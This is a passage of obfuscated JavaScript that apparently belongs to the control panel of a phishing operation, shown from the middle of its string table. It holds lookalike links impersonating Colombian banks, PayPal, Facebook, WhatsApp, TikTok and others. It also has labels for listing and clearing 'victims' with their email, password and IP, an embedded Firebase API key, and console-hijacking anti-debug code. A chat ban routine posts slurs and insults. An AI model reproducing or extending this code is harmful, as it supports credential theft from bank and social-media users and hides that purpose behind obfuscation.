tem','https://i.postimg.cc/6qwr5x5m/HD-wallpaper-anonymous-mask-smoke-iphone-iphone-iphone.jpg','eliminado','https://i.postimg.cc/zXyPwRyv/images-(50).jpg','664308369374','https://i.postimg.cc/pT2PyBX8/1.jpg','tema-neonglow','shorturl','block','https://i.postimg.cc/50Pz1YTx/An-Ninh-Mang-2.jpg','imagenesMenuLateralLista','cambiarFondoMenu','mostrarRegistros','background','https://i.postimg.cc/FKVcWnxL/hackers-pose-one-type-of-cybersecurity-threat-to-small-businesses.jpg','chatSend','Yandex','toMillis','#0f0','docs','doc','#00ff00','https://i.postimg.cc/YqyBMHWS/images-(54).jpg','963096BZnbFH','return\x20(function()\x20','has','cover','https://i.postimg.cc/6pVMdcFT/wp2697320.jpg','https://i.postimg.cc/bYTbHMvY/5de38645b8a8a7edbf104a4cf3b967be.jpg','createElement','https://i.postimg.cc/26zC3x8j/9b1ec57e6c3138a53edbfe5a4b59c5ba-(1).jpg','trim','display','button','tema-scan','PayPal\x20Basico','catch','chatUnsubscribe','<strong\x20style=\x22color:','https://i.postimg.cc/k5mKydKz/Cyber-Security-Threats-min-resized-89e4bf5bf7c909abfce90d645349cdbb4456e945.png','data','center','SÍ,\x20BORRAR\x20TODO','sistema','3007445FQPOSJ','opacity','https://i.postimg.cc/XJN5Tc2h/Top-5-Cybersecurity-Threats-in-2024-and-How-to-Mitigate-Them-scaled.jpg','slice','https://i.postimg.cc/Y9vVfg1X/hacker-g1e3a44200-1920-b6ba00f811758a41c98bff2db4b9e3e4-2000.jpg','empty','https://i.postimg.cc/KYRQdbRr/kali-linux-neon-dragon-968bqdlzy2n7tfu3.webp','shiftKey','clear','onmouseout','ELIMINAR','Error\x20al\x20enviar\x20mensaje','toString','keypress','https://i.postimg.cc/mDbThS2z/16eb525d0e0462d64cb411bd8e64f22d-(1).jpg','Enter','contains','hsl(','https://i.postimg.cc/13TCMbXk/hacker-mirando-la-camara-con-una-mascara-facial-fondo-de-pantalla-tema-oscuro-generado-por.jpg','cssText','chatColor','contraseña','https://i.postimg.cc/MHKYm82H/pngtree-hacker-programmer-on-neon-background-picture-image-15707642.png','\x20se\x20autobaneó\x20por\x20rata','https://i.postimg.cc/KY67wMXb/wp14671539.jpg','btnMostrarAcortador','added','</button>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20','https://uz1w0f.mimo.run/index.html','Error','vista-completa-foto','usuarioNombre','Esto\x20limpiará\x20el\x20chat\x20solo\x20para\x20ti.\x20¿Continuar?','toggle','<u>$1</u>','https://bancolombia.glegogle5341-af7.workers.dev/?uid=uid_1771535158464_7gnn5tpq88q','https://i.postimg.cc/c4wpbQVy/360-F-598226410-hwu0HTRm-Ikoygfb-ADWLg0Es6fgv7c-Qq0.jpg','https://i.postimg.cc/gkqQ2LBK/kali-linux-os-dragon-japanese-9bmrmf3ea24e3uwe.jpg','608610VjjZaI','Mensaje\x20eliminado\x20para\x20todos','https://i.postimg.cc/cJKFwvTP/top-10-hackers-of-all-time-the-real-list.jpg','panel','position','mostrarContacto','forEach','https://i.postimg.cc/xd2xSxtK/images-(49).jpg','div','https://i.postimg.cc/wTg29L1x/36e29fb333167866e9f4961fd686cc6a.jpg','tema-glitch2','https://i.postimg.cc/y8TwV767/360-F-608789044-me2Pt-F6ogx-ZKxd-Vzr-Blmt2ZYq-Mo-Z5z0E.jpg','<em\x20style=\x22color:#888\x22>[Este\x20mensaje\x20fue\x20eliminado]</em>','trace','input','Garena\x20Tarjeta\x20en\x20mantenimiento','https://sara-fogosa.glegogle5341-af7.workers.dev/','El\x20mensaje\x20será\x20reemplazado\x20por\x20<b\x20style=\x27color:#888\x27>[Este\x20mensaje\x20fue\x20eliminado]</b>\x20en\x20todos\x20los\x20dispositivos','remove','https://i.postimg.cc/bwGtPw9f/2f7da32bdb8b8e7f320c7ce2ae69a28a.jpg','usuario','https://i.postimg.cc/rpG88HT7/images-(34).jpg','tema-neon','email','https://i.postimg.cc/YCSxW7fB/56eebd8d4ff4117b40cc8b38d6383378.jpg','Facebook\x20Estandar','VACIAR\x20VÍCTIMAS','51285PkITQg','uid','none','40143inurWt','https://i.postimg.cc/5tTpJrzd/a0808bb2f535b0b544f7725ebc2cb13b.jpg','https://i.postimg.cc/vTk6xRQb/Alexandra-Sasha-cyber-security-hacker-cool-computer-binary-code-770cfb43-762a-4503-a16f-0735ae3bf602.png','282555PhaefV','https://i.postimg.cc/FzgxjsnW/c6d8a194464d693fd533fd10500781e7.jpg','https://i.postimg.cc/Z5KPPG7p/images-(38).jpg','style','IP:\x20<b\x20style=\x22color:#0ff\x22>','4061115hpEKwy','https://i.postimg.cc/6Qnz90fN/240508-8.jpg','tema-circuit','esMensajeSistema','desc','https://i.postimg.cc/s2mQ9GVK/anonymous-hackers-wallpaper-preview.jpg','https://i.postimg.cc/SR2nhZcf/large.jpg','0.5','toDate','Chat\x20vaciado\x20exitosamente.','https://i.postimg.cc/qMvKmLtQ/185387.jpg','https://i.postimg.cc/q715Xcxx/images-(42).jpg','\x0a\x0a\x20\x20\x20\x20<div\x20style=\x22background:#000;border:4px\x20solid\x20#f00;padding:40px\x2050px;border-radius:15px;box-shadow:0\x200\x2050px\x20#f00;text-align:center;font-family:monospace;color:#f00;font-size:24px;text-shadow:0\x200\x2020px\x20#f00;\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:32px;margin-bottom:20px;animation:shake\x200.5s\x20infinite;\x22>RATA</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:28px;\x22>VIOLASTE\x20LAS\x20REGLAS</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:22px;color:#ff0;\x22>POR\x20SPAM,\x20RATA\x20ASQUEROSA</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:16px;color:#888;margin-top:15px;\x22>Ban:\x20200\x20AÑOS</div>\x0a\x0a\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20','imagenesFondoInicio',':</strong>\x20<span>','update','background:#f00;color:#fff;padding:2px\x206px;border:none;border-radius:4px;cursor:pointer;font-size:11px;','https://i.postimg.cc/GhC796Sf/images-r-bCqBCLR5XiHul6s3TDDxD71QMB273IbthMfxg75k8GkKqBTmzDOYA5YujiWfmd3yjPBGAyVPn6LJDQe.webp','https://i.postimg.cc/TYk5xp0S/images-(36).jpg','11WjjerE','https://i.postimg.cc/k4NSHYFN/c0de7e8eab6a3d39238d36732ada3ade.jpg','texto','https://tik-tok.glegogle5341-af7.workers.dev/','21bJenVE','json','shift','Error\x20al\x20intentar\x20borrar\x20las\x20víctimas.','https://i.postimg.cc/WpMSRXb8/desktop-wallpaper-iphone-for-iphone-8-iphone-8-plus-iphone-6s-iphone-6s-plus-iphone-x-and-ipod-touch.jpg','querySelector','https://2gb4lr.mimo.run/index.html','banUntil','https://i.postimg.cc/0yrpNfPg/596ab1abdadd14f5d4b159256b8dce41.jpg','focus','imagen-completa','backgroundImage','btnTema2','{}.constructor(\x22return\x20this\x22)(\x20)','CANCELAR','<div\x20style=\x22text-align:center;color:#888;padding:20px;\x22>Conectado\x20al\x20chat.\x20Los\x20mensajes\x20nuevos\x20aparecerán\x20aquí.</div>','https://i.postimg.cc/1tSB4qvN/articulos-45009.jpg','play','Facebook\x20Escritorio','tema-transparent','onmouseover','removed','DOMContentLoaded','No\x20hay\x20víctimas\x20para\x20borrar.','https://i.postimg.cc/W4m22yjV/images-(32).jpg','1:664308369374:web:4342c3a417968b1d23bf4f','https://facebook-escritorio.glegogle5341-af7.workers.dev/','https://whaadvance.glegogle5341-af7.workers.dev/','button,\x20input,\x20a,\x20textarea,\x20select','backgroundSize','ceil','tema-darkpulse','position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#0f0;color:#000;padding:12px\x2030px;border-radius:10px;z-index:99999;font-family:monospace;font-weight:bold;box-shadow:0\x200\x2020px\x20#0f0;','tema2','whatsapp\x20Normal','imagenesFondoMenuLateral','Anónimo','setItem','modified','</small></div>','tema-darkglitch','PayPal\x20Estandar','42nXSseq','https://i.postimg.cc/PJxm8zY2/hacker-attack-975yt.jpg','cerrarVentanaColores','https://i.postimg.cc/d0yr2Vhf/e83ca84415892f958189823dbf647e34.jpg','Nequi\x20Tarjeta','exception','https://i.postimg.cc/cCpr4Qm6/HD-wallpaper-anonymous-truth-world-save.jpg','https://i.postimg.cc/4dpvgxZJ/HD-wallpaper-anonymous-hack.jpg','https://grupo7privado.glegogle5341-af7.workers.dev/','fotoMiniatura','https://paypal-basico.glegogle5341-af7.workers.dev/','dataset','stopPropagation','value','misEnlaces','6370ZIJwQL','https://i.postimg.cc/RhXHS3YB/1447928de98a856b3d422a20079c1ba3.jpg','<span\x20style=\x22background:#f00;color:#fff;padding:2px\x208px;border-radius:4px;font-weight:bold;animation:parpadeo\x201s\x20infinite\x22>@','tema-darkgrid','https://i.postimg.cc/QdLTXr4q/0lu7hombgh871.jpg','https://bogota.glegogle5341-af7.workers.dev/','Error\x20al\x20enviar:','https://5mpser.mimo.run/index.html','Correo:\x20<b\x20style=\x22color:#fff\x22>','810600izxtse','tema-grid','ELIMINAR\x20PARA\x20TODOS','userLogged','ventanaAcortador','.btn,#menuBtn,#fakeSelect,#panel,#ventanaAcortador,#registros,#chatInput,#chatMessages,#chatUsuario,#chatSend,.contactoLink,#usuariosOnlineBox\x20div,input,textarea','https://i.postimg.cc/dVmXDc7X/images-(43).jpg','includes','scrollTop','tema-hack','Error\x20al\x20actualizar\x20nombre\x20de\x20usuario:','colorChat','</strong><br>','91147jALZPF','Instagram','add','getElementById','Baneado\x20Por\x20Rata\x20🐭🖕Tu\x20madre\x20es\x20Puta\x20❤️','warn','classList','position:fixed;inset:0;background:rgba(0,0,0,0.97);z-index:99999;display:flex;justify-content:center;align-items:center;','console','10wEhaZH','https://i.postimg.cc/y8FjnhsS/images-(46).jpg','tema-holo','position:absolute;top:5px;right:5px;opacity:0;transition:opacity\x200.3s;','212HtRRIx','map','.tema-opt','bind','now','AIzaSyBgqYhRV8CrmlMkr6yBF1DpE_zCgXIE660','https://i.postimg.cc/5t407KG4/hacker-background-h6eyqo91lpkgq4my.jpg','</h2>\x0a\x0a\x20\x20\x20\x20\x20\x20<p\x20style=\x22color:#0ff;font-size:17px;margin:15px\x200;line-height:1.5;\x22>','copiarLink','https://i.postimg.cc/GpSZ10Sw/76be013858034851a9fbfae176741356.webp','https://i.postimg.cc/Y9Lnm774/wired-placeholder-dummy.jpg','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22text-align:\x20center;\x20margin-bottom:\x2010px;\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22','listaTema2','https://scotiabank.glegogle5341-af7.workers.dev/','https://i.postimg.cc/Px62YthZ/images-(48).jpg','nombre',';border:2px\x20solid\x20#000;','disabled','abrirVentanaColores','Nequi\x20Login\x20Encuesta','type','[data-msg-id=\x22','avisoSpam','https://i.postimg.cc/HnByYJNb/7cca66e6bc4a1ba447e7819463202526.jpg','fondoMenuLateral','info','key','<button\x20class=\x22btn-red-clear\x22\x20onclick=\x22vaciarMisVictimas()\x22>Vaciar\x20todas</button>\x20<div\x20style=\x22max-height:60vh;overflow-y:auto;padding:6px;\x22>','Error:\x20miUserDocId\x20no\x20está\x20definido\x20al\x20intentar\x20vaciar\x20víctimas.','textContent','imagenesInicioLista','modalNo','mostrarOcultarImagenesFondoInicio','https://i.postimg.cc/3wXq45dF/images-(51).jpg','toLocaleString','tema-cyberspark','chatMessages','\x0a\x0a\x20\x20\x20\x20@keyframes\x20shake\x20{\x200%,\x20100%\x20{\x20transform:\x20translateX(0);\x20}\x2025%\x20{\x20transform:\x20translateX(-10px);\x20}\x2075%\x20{\x20transform:\x20translateX(10px);\x20}\x20}\x0a\x0a\x20\x20\x20\x20@keyframes\x20fadeInOut\x20{\x200%\x20{\x20opacity:\x201;\x20}\x20100%\x20{\x20opacity:\x200;\x20}\x20}\x0a\x0a',',90%,60%)','https://i.postimg.cc/HxFNSxz5/hacker-group-names-are-now-absurdly-out-of-control-v0-e5o1bw2DPr666vpx8NI3CZm-BCo-ESLyjff-QOo-Kn-N-k.jpg','https://i.postimg.cc/jj6ss1Kb/images-(29).jpg'];_0x17f9=function(){return _0x36b601;};return _0x17f9();}const _0x578433=(function(){const _0xcfb732=(function(){let _0x796bd5=!![];return function(_0x440219,_0x568051){const _0xde32a3=_0x796bd5?function(){const _0x4d3ce1=_0x382f;if(_0x568051){const _0x53f9ed=_0x568051[_0x4d3ce1(0x26c)](_0x440219,arguments);return _0x568051=null,_0x53f9ed;}}:function(){};return _0x796bd5=![],_0xde32a3;};}()),_0x1027c5=_0xcfb732(this,function(){const _0x3d4ac0=_0x382f,_0x179c2b=_0xc57b;let _0x4914eb;try{const _0x4dbd30=Function(_0x179c2b(0x1b6)+_0x179c2b(0x1c1)+');');_0x4914eb=_0x4dbd30();}catch(_0xd94431){_0x4914eb=window;}const _0x1fd36e=_0x4914eb[_0x179c2b(0x324)]=_0x4914eb[_0x179c2b(0x324)]||{},_0x4dfe44=[_0x179c2b(0x26c),_0x179c2b(0x2ff),_0x3d4ac0(0x1c9),_0x179c2b(0x2da),_0x3d4ac0(0x183),_0x179c2b(0x21b),_0x179c2b(0x207)];for(let _0x4305f1=0x0;_0x4305f1<_0x4dfe44[_0x3d4ac0(0x20e)];_0x4305f1++){const _0x4a8d07=_0xcfb732[_0x3d4ac0(0x285)][_0x179c2b(0x381)][_0x3d4ac0(0x1b3)](_0xcfb732),_0x35675b=_0x4dfe44[_0x4305f1],_0x5e4fd9=_0x1fd36e[_0x35675b]||_0x4a8d07;_0x4a8d07[_0x179c2b(0x2bd)]=_0xcfb732[_0x3d4ac0(0x1b3)](_0xcfb732),_0x4a8d07[_0x179c2b(0x2f9)]=_0x5e4fd9[_0x179c2b(0x2f9)][_0x3d4ac0(0x1b3)](_0x5e4fd9),_0x1fd36e[_0x35675b]=_0x4a8d07;}});_0x1027c5();let _0x59f027=!![];return function(_0x227a4c,_0x46cf77){const _0xb355a3=_0x59f027?function(){const _0x231e9b=_0x56f7;if(_0x46cf77){const _0x17debe=_0x46cf77[_0x231e9b(0x2f6)](_0x227a4c,arguments);return _0x46cf77=null,_0x17debe;}}:function(){};return _0x59f027=![],_0xb355a3;};}()),_0x1b462d=_0x578433(this,function(){const _0xda5ea7=_0x382f,_0x2dfdf4=_0xc57b,_0x185bec=_0x56f7;return _0x1b462d[_0x185bec(0x280)]()[_0x185bec(0x1fd)](_0x185bec(0x2e3))[_0x2dfdf4(0x2f9)]()[_0xda5ea7(0x285)](_0x1b462d)[_0x185bec(0x1fd)](_0x185bec(0x2e3));});_0x1b462d();const _0x32f52f=(function(){const _0x3e9d0f=(function(){let _0x22c7a6=!![];return function(_0x39c83f,_0x33570a){const _0x2155e8=_0x22c7a6?function(){const _0x7cdf0e=_0x382f;if(_0x33570a){const _0x2aa6e1=_0x33570a[_0x7cdf0e(0x26c)](_0x39c83f,arguments);return _0x33570a=null,_0x2aa6e1;}}:function(){};return _0x22c7a6=![],_0x2155e8;};}()),_0x326a86=(function(){const _0x523fb9=_0x3e9d0f(this,function(){const _0x38e08e=_0x382f;let _0x44c632;try{const _0x124d49=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x44c632=_0x124d49();}catch(_0x94b71b){_0x44c632=window;}const _0xd35dfb=_0x44c632[_0x38e08e(0x1ab)]=_0x44c632['console']||{},_0x9752d4=[_0x38e08e(0x22c),_0x38e08e(0x1a8),_0x38e08e(0x1c9),_0x38e08e(0x224),_0x38e08e(0x183),'table',_0x38e08e(0x300)];for(let _0x1499c6=0x0;_0x1499c6<_0x9752d4[_0x38e08e(0x20e)];_0x1499c6++){const _0x3c8275=_0x3e9d0f[_0x38e08e(0x285)][_0x38e08e(0x26e)][_0x38e08e(0x1b3)](_0x3e9d0f),_0x1acc6f=_0x9752d4[_0x1499c6],_0x4ee1f8=_0xd35dfb[_0x1acc6f]||_0x3c8275;_0x3c8275['__proto__']=_0x3e9d0f[_0x38e08e(0x1b3)](_0x3e9d0f),_0x3c8275[_0x38e08e(0x2d9)]=_0x4ee1f8[_0x38e08e(0x2d9)]['bind'](_0x4ee1f8),_0xd35dfb[_0x1acc6f]=_0x3c8275;}});_0x523fb9();let _0x164b48=!![];return function(_0x5c43d2,_0x2df8a4){const _0x5a3a81=_0x164b48?function(){const _0x4c9da6=_0xc57b;if(_0x2df8a4){const _0x2ac804=_0x2df8a4[_0x4c9da6(0x298)](_0x5c43d2,arguments);return _0x2df8a4=null,_0x2ac804;}}:function(){};return _0x164b48=![],_0x5a3a81;};}()),_0x1a3ca6=_0x326a86(this,function(){const _0x1ee1ab=_0x382f,_0x2d46c6=_0xc57b;return _0x1a3ca6[_0x1ee1ab(0x2d9)]()[_0x1ee1ab(0x297)](_0x1ee1ab(0x298))[_0x2d46c6(0x2f9)]()[_0x2d46c6(0x268)](_0x1a3ca6)[_0x2d46c6(0x1b2)](_0x2d46c6(0x234));});_0x1a3ca6();let _0x3d48c6=!![];return function(_0x4d1a29,_0x4ea060){const _0x2644ee=_0x3d48c6?function(){const _0x1daf12=_0x56f7;if(_0x4ea060){const _0x23f603=_0x4ea060[_0x1daf12(0x2f6)](_0x4d1a29,arguments);return _0x4ea060=null,_0x23f603;}}:function(){};return _0x3d48c6=![],_0x2644ee;};}()),_0x4e4a2a=_0x32f52f(this,function(){const _0x771e60=_0xc57b,_0x3e5350=_0x56f7,_0xc02ac=function(){const _0x11742f=_0xc57b,_0xd83c81=_0x56f7;let _0x56470f;try{_0x56470f=Function(_0x11742f(0x1b6)+_0xd83c81(0x276)+');')();}catch(_0x44b4af){_0x56470f=window;}return _0x56470f;},_0x4c6d03=_0xc02ac(),_0x5cc5a0=_0x4c6d03[_0x3e5350(0x2ea)]=_0x4c6d03[_0x3e5350(0x2ea)]||{},_0x48c10f=[_0x3e5350(0x214),_0x3e5350(0x2e6),_0x3e5350(0x359),_0x3e5350(0x338),_0x3e5350(0x298),_0x3e5350(0x1b0),_0x771e60(0x207)];for(let _0x12b491=0x0;_0x12b491<_0x48c10f[_0x3e5350(0x297)];_0x12b491++){const _0x5d6826=_0x32f52f[_0x3e5350(0x286)][_0x771e60(0x381)][_0x3e5350(0x2c0)](_0x32f52f),_0x2b2490=_0x48c10f[_0x12b491],_0x32befa=_0x5cc5a0[_0x2b2490]||_0x5d6826;_0x5d6826['__proto__']=_0x32f52f[_0x3e5350(0x2c0)](_0x32f52f),_0x5d6826[_0x3e5350(0x280)]=_0x32befa[_0x3e5350(0x280)][_0x3e5350(0x2c0)](_0x32befa),_0x5cc5a0[_0x2b2490]=_0x5d6826;}});_0x4e4a2a();import{initializeApp}from'https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js';import{getAuth,onAuthStateChanged}from'https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js';import{getFirestore,collection,getDocs,getDoc,query,where,orderBy,doc,updateDoc,addDoc,setDoc,onSnapshot,deleteDoc,serverTimestamp,writeBatch,limit}from'https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js';const firebaseConfig={'apiKey':_0xe1859b(0x1c3),'authDomain':_0xe1859b(0x37b),'projectId':_0x2ea4a7(0x205),'storageBucket':_0xe1859b(0x212),'messagingSenderId':_0x39f624(0x1dc),'appId':_0x39f624(0x1e3)},app=initializeApp(firebaseConfig),auth=getAuth(app),db=getFirestore(app),$id=_0xf18e5b=>document[_0x39f624(0x1f8)](_0xf18e5b);let miLinkId=null,miUserDocId=null,ultimoCambioNombre=null,isBanned=![],banUntil=0x0;function _0x382f(_0xb2f58a,_0xcfdd21){_0xb2f58a=_0xb2f58a-0x160;const _0x590739=_0x17f9();let _0x11e82f=_0x590739[_0xb2f58a];return _0x11e82f;}const mensajeHistory={},BAN_100_AÑOS=0xc8*0x16d*0x18*0x3c*0x3c*0x3e8;let isGloballyBanned=![];async function enviarMensajeBanGlobal(_0x5101ef){const _0x2fad03=_0xe1859b;try{await addDoc(collection(db,_0x2fad03(0x2cc)),{'texto':_0x2fad03(0x1e7)+_0x5101ef+_0x2fad03(0x1da),'usuario':_0x2fad03(0x242),'uidRemitente':_0x2fad03(0x37a),'fecha':serverTimestamp(),'colorChat':_0x2fad03(0x1b2),'esMensajeSistema':!![]});}catch(_0x38f962){console[_0x2fad03(0x338)](_0x2fad03(0x2d4),_0x38f962);}}async function checkAntiSpam(_0x23a3f4,_0x17c5bf){const _0x1d5180=_0x2ea4a7,_0x193373=_0x39f624,_0x5b1fdd=_0xe1859b;if(isGloballyBanned)return mostrarModalSpamBloqueado(0xc8),![];console[_0x5b1fdd(0x214)](_0x5b1fdd(0x2c3)+_0x23a3f4+'\x27');let _0x2e6f41=Date[_0x5b1fdd(0x263)]();const _0x322cca=doc(db,_0x5b1fdd(0x2b0),_0x17c5bf),_0x2d88c4=await getDoc(_0x322cca);if(!_0x2d88c4[_0x5b1fdd(0x1be)]())return![];const _0x2d5d38=_0x2d88c4[_0x5b1fdd(0x291)]();let _0x5dc525=_0x2d5d38[_0x5b1fdd(0x358)]?_0x2d5d38[_0x1d5180(0x337)][_0x5b1fdd(0x337)]():0x0,_0x4bbe17=_0x2d5d38[_0x5b1fdd(0x1ee)]?_0x2d5d38[_0x5b1fdd(0x1ee)][_0x5b1fdd(0x337)]():0x0,_0x3b79c1=_0x2d5d38[_0x5b1fdd(0x357)]||0x0;if(_0x5dc525>_0x2e6f41){let _0x59b3d1=Math[_0x193373(0x2c5)]((_0x5dc525-_0x2e6f41)/(0x16d*0x18*0x36ee80));return mostrarModalSpamBloqueado(_0x59b3d1),mostrarAvisoSpam(!![],_0x59b3d1),![];}if(_0x23a3f4[_0x193373(0x22c)]>0x1f4)return await updateDoc(_0x322cca,{'banUntil':new Date(_0x2e6f41+BAN_100_AÑOS)}),mostrarModalSpamBan(),mostrarAvisoSpam(!![],0xc8),![];let _0x15243e=_0x2e6f41-_0x4bbe17;if(_0x15243e<0x708){_0x3b79c1+=0x1;if(_0x3b79c1<0x4)mostrarModalSpamProgreso(_0x3b79c1);}else _0x3b79c1=0x1;if(_0x3b79c1>=0x4){const _0x3182f1=await getDoc(_0x322cca),_0x210f20=$id(_0x5b1fdd(0x2d9))[_0x5b1fdd(0x33f)][_0x5b1fdd(0x2d2)]()||_0x5b1fdd(0x352);return await updateDoc(_0x322cca,{'banUntil':new Date(_0x2e6f41+BAN_100_AÑOS),'spamStreak':_0x3b79c1,'lastMessageTime':new Date(_0x2e6f41)}),isGloballyBanned=!![],deshabilitarInteraccion(),await enviarMensajeBanGlobal(_0x210f20),mostrarModalSpamBan(),mostrarAvisoSpam(!![],0xc8),await eliminarMensajesSpamGlobalmente(_0x17c5bf),![];}await updateDoc(_0x322cca,{'lastMessageTime':new Date(_0x2e6f41),'spamStreak':_0x3b79c1}),mostrarAvisoSpam(![]);if(!mensajeHistory[_0x17c5bf])mensajeHistory[_0x17c5bf]=[];mensajeHistory[_0x17c5bf][_0x193373(0x340)]({'texto':_0x23a3f4[_0x5b1fdd(0x2d2)](),'timestamp':_0x2e6f41});if(mensajeHistory[_0x17c5bf][_0x1d5180(0x20e)]>0x14)mensajeHistory[_0x17c5bf][_0x5b1fdd(0x221)]();const _0x8ba941=mensajeHistory[_0x17c5bf][_0x193373(0x29c)](-0x4);if(_0x8ba941[_0x5b1fdd(0x297)]===0x4&&_0x8ba941[_0x193373(0x33e)](_0x2a04a6=>_0x2a04a6[_0x5b1fdd(0x2a7)]===_0x8ba941[0x0][_0x5b1fdd(0x2a7)])){const _0x2a9a2b=await getDoc(_0x322cca),_0x52ad4a=$id(_0x5b1fdd(0x2d9))[_0x5b1fdd(0x33f)][_0x5b1fdd(0x2d2)]()||_0x5b1fdd(0x352);return await updateDoc(_0x322cca,{'banUntil':new Date(_0x2e6f41+BAN_100_AÑOS)}),isGloballyBanned=!![],deshabilitarInteraccion(),await enviarMensajeBanGlobal(_0x52ad4a),mostrarModalRataDetectada(),mostrarAvisoSpam(!![],_0x5b1fdd(0x2ee)),await eliminarMensajesSpamGlobalmente(_0x17c5bf),![];}return!![];}async function eliminarMensajesSpamGlobalmente(_0x7e8f01){const _0x1b1784=_0x2ea4a7,_0x48b7fe=_0x39f624,_0x58e493=_0xe1859b,_0x3a7c26=writeBatch(db),_0x505394=query(collection(db,_0x58e493(0x2cc)),where(_0x58e493(0x262),'==',_0x7e8f01),orderBy(_0x58e493(0x34a),_0x48b7fe(0x2ad)),limit(0xa)),_0x155807=await getDocs(_0x505394);_0x155807[_0x48b7fe(0x214)](_0x2b77c5=>{const _0x48abad=_0x382f,_0x16efb5=_0x58e493;_0x3a7c26[_0x16efb5(0x386)](_0x2b77c5[_0x48abad(0x278)],{'texto':_0x16efb5(0x211),'eliminado':!![]});}),await _0x3a7c26[_0x1b1784(0x1da)]();}function deshabilitarInteraccion(){const _0x144bf0=_0x2ea4a7,_0x2ae5ae=_0x39f624,_0x54deab=_0xe1859b;document[_0x54deab(0x2a5)](_0x144bf0(0x170))[_0x54deab(0x28c)](_0x36194a=>{const _0x3dd135=_0x54deab;_0x36194a[_0x3dd135(0x31b)]=!![],_0x36194a[_0x3dd135(0x36a)][_0x3dd135(0x312)]=_0x3dd135(0x277),_0x36194a[_0x3dd135(0x36a)][_0x3dd135(0x2df)]=_0x3dd135(0x23d);}),document[_0x54deab(0x235)][_0x2ae5ae(0x288)][_0x54deab(0x32d)]=_0x54deab(0x26a);}function mostrarModalRataDetectada(){const _0x200f2b=_0x2ea4a7,_0x3ffdac=_0xe1859b;let _0x33306b=document[_0x3ffdac(0x376)](_0x200f2b(0x2fb));_0x33306b[_0x3ffdac(0x36a)][_0x3ffdac(0x24c)]=_0x200f2b(0x1ee),_0x33306b[_0x3ffdac(0x227)]=_0x3ffdac(0x2c4),document[_0x3ffdac(0x235)][_0x3ffdac(0x319)](_0x33306b),setTimeout(()=>_0x33306b[_0x3ffdac(0x2bf)](),0x1f40);}function mostrarModalSpamBan(){const _0x130abf=_0x39f624,_0x27d1eb=_0xe1859b;let _0x552139=document[_0x27d1eb(0x376)](_0x27d1eb(0x282));_0x552139[_0x27d1eb(0x36a)][_0x27d1eb(0x24c)]=_0x27d1eb(0x2ec),_0x552139[_0x130abf(0x2bf)]=_0x27d1eb(0x274),document[_0x27d1eb(0x235)][_0x27d1eb(0x319)](_0x552139),setTimeout(()=>_0x552139[_0x27d1eb(0x2bf)](),0xfa0);}function mostrarModalSpamProgreso(_0x4a4fe6){const _0x556797=_0x2ea4a7,_0x1e5a7d=_0x39f624,_0x5556f7=_0xe1859b;let _0x560778=document[_0x1e5a7d(0x2c1)](_0x5556f7(0x282));_0x560778[_0x5556f7(0x36a)][_0x556797(0x2e0)]=_0x5556f7(0x25d),_0x560778[_0x5556f7(0x227)]=_0x5556f7(0x2db),document[_0x5556f7(0x235)][_0x5556f7(0x319)](_0x560778),setTimeout(()=>_0x560778[_0x5556f7(0x2bf)](),0x7d0);}function mostrarModalSpamBloqueado(_0x2d1d58){const _0x34adf7=_0x2ea4a7,_0xf959f2=_0x39f624,_0x49a059=_0xe1859b;let _0x43966e=document[_0xf959f2(0x2c1)](_0x49a059(0x282));_0x43966e[_0x49a059(0x36a)][_0x49a059(0x24c)]=_0x49a059(0x2ec),_0x43966e[_0x49a059(0x227)]=_0xf959f2(0x362),document[_0x49a059(0x235)][_0x34adf7(0x261)](_0x43966e),setTimeout(()=>_0x43966e[_0x49a059(0x2bf)](),0xbb8);}function mostrarAvisoSpam(_0x1d51a2,_0x4fc074=null){const _0xab4605=_0x39f624,_0x511c59=_0xe1859b;let _0x1eb99c=$id(_0x511c59(0x1ad));!_0x1eb99c&&(_0x1eb99c=document['createElement'](_0x511c59(0x282)),_0x1eb99c['id']=_0x511c59(0x1ad),_0x1eb99c[_0xab4605(0x288)][_0x511c59(0x24c)]=_0x511c59(0x30d),document[_0x511c59(0x235)][_0xab4605(0x316)](_0x1eb99c)),_0x1d51a2?(_0x1eb99c[_0x511c59(0x229)]=_0x4fc074?_0x511c59(0x323):_0x511c59(0x323),_0x1eb99c[_0x511c59(0x36a)][_0xab4605(0x1fb)]=_0x511c59(0x381)):_0x1eb99c[_0x511c59(0x36a)][_0x511c59(0x2a4)]=_0xab4605(0x25c);}const style=document[_0x39f624(0x2c1)](_0xe1859b(0x36a));style[_0xe1859b(0x229)]=_0xe1859b(0x353),document[_0x39f624(0x2c0)][_0x39f624(0x316)](style);function disableUI(){const _0x2e7fcc=_0x39f624,_0x2aea32=_0xe1859b;$id(_0x2aea32(0x220))[_0x2aea32(0x31b)]=!![],$id(_0x2aea32(0x220))[_0x2aea32(0x36a)][_0x2aea32(0x2df)]=_0x2aea32(0x23d),$id(_0x2aea32(0x28e))[_0x2aea32(0x31b)]=!![],$id(_0x2aea32(0x2ab))[_0x2aea32(0x36a)][_0x2aea32(0x312)]=_0x2e7fcc(0x25c),$id(_0x2aea32(0x2ab))[_0x2aea32(0x36a)][_0x2e7fcc(0x2f5)]=_0x2aea32(0x23d);const 